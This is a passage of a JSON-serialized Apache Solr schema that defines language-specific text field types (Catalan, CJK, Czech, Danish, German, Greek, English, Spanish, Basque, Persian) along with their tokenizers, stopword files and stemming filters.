.analysis.bg.BulgarianStemFilterFactory""}}},""similarity"":{}},""text_ca"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""ElisionFilterFactory"":{""args"":{""articles"":""lang/contractions_ca.txt"",""class"":""solr.ElisionFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.util.ElisionFilterFactory""},""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_ca.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""SnowballPorterFilterFactory"":{""args"":{""class"":""solr.SnowballPorterFilterFactory"",""language"":""Catalan"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""ElisionFilterFactory"":{""args"":{""articles"":""lang/contractions_ca.txt"",""class"":""solr.ElisionFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.util.ElisionFilterFactory""},""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_ca.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""SnowballPorterFilterFactory"":{""args"":{""class"":""solr.SnowballPorterFilterFactory"",""language"":""Catalan"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory""}}},""similarity"":{}},""text_cjk"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""CJKWidthFilterFactory"":{""args"":{""class"":""solr.CJKWidthFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.cjk.CJKWidthFilterFactory""},""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""CJKBigramFilterFactory"":{""args"":{""class"":""solr.CJKBigramFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.cjk.CJKBigramFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""CJKWidthFilterFactory"":{""args"":{""class"":""solr.CJKWidthFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.cjk.CJKWidthFilterFactory""},""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""CJKBigramFilterFactory"":{""args"":{""class"":""solr.CJKBigramFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.cjk.CJKBigramFilterFactory""}}},""similarity"":{}},""text_cz"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_cz.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""CzechStemFilterFactory"":{""args"":{""class"":""solr.CzechStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.cz.CzechStemFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_cz.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""CzechStemFilterFactory"":{""args"":{""class"":""solr.CzechStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.cz.CzechStemFilterFactory""}}},""similarity"":{}},""text_da"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_da.txt"",""class"":""solr.StopFilterFactory"",""format"":""snowball"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""SnowballPorterFilterFactory"":{""args"":{""class"":""solr.SnowballPorterFilterFactory"",""language"":""Danish"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_da.txt"",""class"":""solr.StopFilterFactory"",""format"":""snowball"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""SnowballPorterFilterFactory"":{""args"":{""class"":""solr.SnowballPorterFilterFactory"",""language"":""Danish"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory""}}},""similarity"":{}},""text_de"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_de.txt"",""class"":""solr.StopFilterFactory"",""format"":""snowball"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""GermanNormalizationFilterFactory"":{""args"":{""class"":""solr.GermanNormalizationFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.de.GermanNormalizationFilterFactory""},""GermanLightStemFilterFactory"":{""args"":{""class"":""solr.GermanLightStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.de.GermanLightStemFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_de.txt"",""class"":""solr.StopFilterFactory"",""format"":""snowball"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""GermanNormalizationFilterFactory"":{""args"":{""class"":""solr.GermanNormalizationFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.de.GermanNormalizationFilterFactory""},""GermanLightStemFilterFactory"":{""args"":{""class"":""solr.GermanLightStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.de.GermanLightStemFilterFactory""}}},""similarity"":{}},""text_el"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""GreekLowerCaseFilterFactory"":{""args"":{""class"":""solr.GreekLowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.el.GreekLowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_el.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""false"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""GreekStemFilterFactory"":{""args"":{""class"":""solr.GreekStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.el.GreekStemFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""GreekLowerCaseFilterFactory"":{""args"":{""class"":""solr.GreekLowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.el.GreekLowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_el.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""false"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""GreekStemFilterFactory"":{""args"":{""class"":""solr.GreekStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.el.GreekStemFilterFactory""}}},""similarity"":{}},""text_en"":{""fields"":[""*_en""],""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_en.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""EnglishPossessiveFilterFactory"":{""args"":{""class"":""solr.EnglishPossessiveFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.en.EnglishPossessiveFilterFactory""},""KeywordMarkerFilterFactory"":{""args"":{""protected"":""protwords.txt"",""class"":""solr.KeywordMarkerFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.miscellaneous.KeywordMarkerFilterFactory""},""PorterStemFilterFactory"":{""args"":{""class"":""solr.PorterStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.en.PorterStemFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""SynonymFilterFactory"":{""args"":{""class"":""solr.SynonymFilterFactory"",""expand"":""true"",""synonyms"":""synonyms.txt"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.synonym.SynonymFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_en.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""EnglishPossessiveFilterFactory"":{""args"":{""class"":""solr.EnglishPossessiveFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.en.EnglishPossessiveFilterFactory""},""KeywordMarkerFilterFactory"":{""args"":{""protected"":""protwords.txt"",""class"":""solr.KeywordMarkerFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.miscellaneous.KeywordMarkerFilterFactory""},""PorterStemFilterFactory"":{""args"":{""class"":""solr.PorterStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.en.PorterStemFilterFactory""}}},""similarity"":{}},""text_en_splitting"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.core.WhitespaceTokenizerFactory"",""args"":{""class"":""solr.WhitespaceTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_en.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""WordDelimiterFilterFactory"":{""args"":{""generateNumberParts"":""1"",""splitOnCaseChange"":""1"",""catenateWords"":""1"",""class"":""solr.WordDelimiterFilterFactory"",""generateWordParts"":""1"",""luceneMatchVersion"":""LUCENE_44"",""catenateAll"":""0"",""catenateNumbers"":""1""},""className"":""org.apache.lucene.analysis.miscellaneous.WordDelimiterFilterFactory""},""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""KeywordMarkerFilterFactory"":{""args"":{""protected"":""protwords.txt"",""class"":""solr.KeywordMarkerFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.miscellaneous.KeywordMarkerFilterFactory""},""PorterStemFilterFactory"":{""args"":{""class"":""solr.PorterStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.en.PorterStemFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.core.WhitespaceTokenizerFactory"",""args"":{""class"":""solr.WhitespaceTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""SynonymFilterFactory"":{""args"":{""class"":""solr.SynonymFilterFactory"",""expand"":""true"",""synonyms"":""synonyms.txt"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.synonym.SynonymFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_en.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""WordDelimiterFilterFactory"":{""args"":{""generateNumberParts"":""1"",""splitOnCaseChange"":""1"",""catenateWords"":""0"",""class"":""solr.WordDelimiterFilterFactory"",""generateWordParts"":""1"",""luceneMatchVersion"":""LUCENE_44"",""catenateAll"":""0"",""catenateNumbers"":""0""},""className"":""org.apache.lucene.analysis.miscellaneous.WordDelimiterFilterFactory""},""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""KeywordMarkerFilterFactory"":{""args"":{""protected"":""protwords.txt"",""class"":""solr.KeywordMarkerFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.miscellaneous.KeywordMarkerFilterFactory""},""PorterStemFilterFactory"":{""args"":{""class"":""solr.PorterStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.en.PorterStemFilterFactory""}}},""similarity"":{}},""text_en_splitting_tight"":{""fields"":[""sku""],""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.core.WhitespaceTokenizerFactory"",""args"":{""class"":""solr.WhitespaceTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""SynonymFilterFactory"":{""args"":{""class"":""solr.SynonymFilterFactory"",""expand"":""false"",""synonyms"":""synonyms.txt"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.synonym.SynonymFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_en.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""WordDelimiterFilterFactory"":{""args"":{""generateNumberParts"":""0"",""catenateWords"":""1"",""class"":""solr.WordDelimiterFilterFactory"",""generateWordParts"":""0"",""luceneMatchVersion"":""LUCENE_44"",""catenateAll"":""0"",""catenateNumbers"":""1""},""className"":""org.apache.lucene.analysis.miscellaneous.WordDelimiterFilterFactory""},""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""KeywordMarkerFilterFactory"":{""args"":{""protected"":""protwords.txt"",""class"":""solr.KeywordMarkerFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.miscellaneous.KeywordMarkerFilterFactory""},""EnglishMinimalStemFilterFactory"":{""args"":{""class"":""solr.EnglishMinimalStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.en.EnglishMinimalStemFilterFactory""},""RemoveDuplicatesTokenFilterFactory"":{""args"":{""class"":""solr.RemoveDuplicatesTokenFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.miscellaneous.RemoveDuplicatesTokenFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.core.WhitespaceTokenizerFactory"",""args"":{""class"":""solr.WhitespaceTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""SynonymFilterFactory"":{""args"":{""class"":""solr.SynonymFilterFactory"",""expand"":""false"",""synonyms"":""synonyms.txt"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.synonym.SynonymFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_en.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""WordDelimiterFilterFactory"":{""args"":{""generateNumberParts"":""0"",""catenateWords"":""1"",""class"":""solr.WordDelimiterFilterFactory"",""generateWordParts"":""0"",""luceneMatchVersion"":""LUCENE_44"",""catenateAll"":""0"",""catenateNumbers"":""1""},""className"":""org.apache.lucene.analysis.miscellaneous.WordDelimiterFilterFactory""},""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""KeywordMarkerFilterFactory"":{""args"":{""protected"":""protwords.txt"",""class"":""solr.KeywordMarkerFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.miscellaneous.KeywordMarkerFilterFactory""},""EnglishMinimalStemFilterFactory"":{""args"":{""class"":""solr.EnglishMinimalStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.en.EnglishMinimalStemFilterFactory""},""RemoveDuplicatesTokenFilterFactory"":{""args"":{""class"":""solr.RemoveDuplicatesTokenFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.miscellaneous.RemoveDuplicatesTokenFilterFactory""}}},""similarity"":{}},""text_es"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_es.txt"",""class"":""solr.StopFilterFactory"",""format"":""snowball"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""SpanishLightStemFilterFactory"":{""args"":{""class"":""solr.SpanishLightStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.es.SpanishLightStemFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_es.txt"",""class"":""solr.StopFilterFactory"",""format"":""snowball"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""SpanishLightStemFilterFactory"":{""args"":{""class"":""solr.SpanishLightStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.es.SpanishLightStemFilterFactory""}}},""similarity"":{}},""text_eu"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_eu.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""SnowballPorterFilterFactory"":{""args"":{""class"":""solr.SnowballPorterFilterFactory"",""language"":""Basque"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_eu.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""SnowballPorterFilterFactory"":{""args"":{""class"":""solr.SnowballPorterFilterFactory"",""language"":""Basque"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory""}}},""similarity"":{}},""text_fa"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""charFilters"":{""PersianCharFilterFactory"":{""args"":{""class"":""solr.PersianCharFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.fa.PersianCharFilterFactory""}},""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""ArabicNormalizationFilterFactory"":{""args"":{""class"":""solr.ArabicNormalizationFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.ar.ArabicNormalizationFilterFactory""},""PersianNormalizationFilterFactory"":{""args"":{""class"":""solr.PersianNormalizationFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.fa.PersianNormalizationFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_fa.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""charFilters"":{""PersianCharFilterFactory"":{""args"":{""class"":""solr.PersianCharFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.fa.PersianCharFilterFactory""}},""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""ArabicNormalizationFilterFactory"":{""args"":{""class"":""solr.ArabicNormalizationFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.ar.ArabicNormalizationFilterFactory""},""PersianNormalizationFilterFactory"":{""args"":{""class"":""solr.PersianNormalizationFilterFactory"",""luceneMatchVersion"":""LUC